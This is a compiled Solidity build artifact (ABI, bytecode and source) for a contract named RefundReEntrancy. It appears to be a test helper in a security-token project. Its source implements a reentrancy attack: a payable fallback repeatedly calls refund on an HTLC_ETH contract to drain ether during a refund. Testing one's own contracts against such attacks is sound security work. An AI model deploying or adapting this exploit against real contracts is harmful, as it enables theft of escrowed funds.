{
  "contractName": "RefundReEntrancy",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_htlcEthAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [
        {
          "internalType": "bytes32",
          "name": "_swapID",
          "type": "bytes32"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051610408380380610408833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b6102f1806101176000396000f3fe60806040526004361061002d5760003560e01c80637ffc6d7314610104578063b69ef8a81461012d5761002e565b5b6702c68af0bb14000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101025760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637249fbb66001546040518263ffffffff1660e01b81526004016100cf919061020e565b600060405180830381600087803b1580156100e957600080fd5b505af11580156100fd573d6000803e3d6000fd5b505050505b005b34801561011057600080fd5b5061012b6004803603810190610126919061025a565b610158565b005b34801561013957600080fd5b506101426101ed565b60405161014f91906102a0565b60405180910390f35b8060018190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16637249fbb6826040518263ffffffff1660e01b81526004016101b8919061020e565b600060405180830381600087803b1580156101d257600080fd5b505af11580156101e6573d6000803e3d6000fd5b5050505050565b600047905090565b6000819050919050565b610208816101f5565b82525050565b600060208201905061022360008301846101ff565b92915050565b600080fd5b610237816101f5565b811461024257600080fd5b50565b6000813590506102548161022e565b92915050565b6000602082840312156102705761026f610229565b5b600061027e84828501610245565b91505092915050565b6000819050919050565b61029a81610287565b82525050565b60006020820190506102b56000830184610291565b9291505056fea26469706673582212204b4f6f3eeacff30f4fe746e781d12386876f69ab2da2b9b83e3a6cdf739a493d64736f6c634300080a0033",
  "immutableReferences": {},
  "source": "pragma solidity 0.8.10;\n\nimport \"../htlc/HTLC_ETH.sol\";\n\n\ncontract RefundReEntrancy {\n\n    HTLC_ETH htlcEth;\n\n    bytes32 id;\n    \n\n    constructor(address _htlcEthAddress) {\n\n        htlcEth = HTLC_ETH(_htlcEthAddress);\n    }\n\n    //  contract recieving ether should have a fallback or receive function but payable\n   \n\n    fallback() external payable {\n\n        // attack implementation\n\n        if(address(htlcEth).balance >= 0.2 ether) {\n\n            htlcEth.refund(id);\n\n        }\n          \n    }\n\n    \n\n    function attack(bytes32 _swapID) external {\n        id = _swapID;\n    \n        htlcEth.refund(_swapID);\n\n    }\n\n    function balance() external view returns (uint256) {\n        return address(this).balance;\n    }\n \n}",
  "sourcePath": "/home/komolehin/Documents/blockchain/TANGLE/security-token/contracts/utils/RefundReEntrancy.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.10+commit.fc410830.Emscripten.clang"
  },
  "schemaVersion": "3.4.6",
  "updatedAt": "2022-04-26T09:47:12.241Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}